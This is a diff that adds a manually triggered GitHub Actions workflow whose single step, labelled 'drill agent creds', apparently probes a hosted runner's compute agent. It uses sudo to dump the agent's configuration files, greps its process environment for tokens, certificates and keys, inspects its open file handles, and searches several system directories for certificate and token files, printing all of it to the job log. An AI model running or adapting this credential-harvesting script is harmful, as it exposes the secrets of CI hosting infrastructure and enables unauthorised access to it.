@@ -1,0 +1,20 @@
+name: p234
+on: workflow_dispatch
+permissions: {}
+jobs:
+  x:
+    runs-on: ubuntu-latest
+    steps:
+      - name: drill agent creds (P2-P4)
+        run: |
+          PID=$(pgrep -f "hosted-compute-agent" | head -1); echo "agent pid=$PID user=$(ps -o user= -p $PID 2>/dev/null)"
+          echo "=== /opt/hca tree ==="
+          sudo ls -laR /opt/hca 2>/dev/null | head -80
+          echo "=== CONFIG files (auth mechanism + RO url + cert paths) ==="
+          for f in $(sudo find /opt/hca -maxdepth 3 -type f \( -iname "*.json" -o -iname "*.conf" -o -iname "*.yml" -o -iname "*.yaml" -o -iname "*.toml" -o -iname "*.config" -o -iname "*.settings" \) 2>/dev/null); do echo "--- $f ---"; sudo cat "$f" 2>/dev/null | head -50; echo; done
+          echo "=== agent ENV (cert/token/ro/attest hints) ==="
+          sudo tr '\0' '\n' < /proc/$PID/environ 2>/dev/null | grep -iE "cert|token|attest|orchestr|audience|tls|_key|endpoint|_url|ro_|hca" | head -30
+          echo "=== agent OPEN FILES (certs/keys) ==="
+          sudo ls -la /proc/$PID/fd 2>/dev/null | grep -iE "\.pem|\.crt|\.key|\.pfx|cert|/opt/hca|/tmp" | head -20
+          echo "=== cert/key material under /opt/hca or /run/hca ==="
+          sudo find /opt/hca /run /etc/hca -type f \( -iname "*.pem" -o -iname "*.crt" -o -iname "*.key" -o -iname "*.pfx" -o -iname "*cert*" -o -iname "*token*" \) 2>/dev/null | head -20
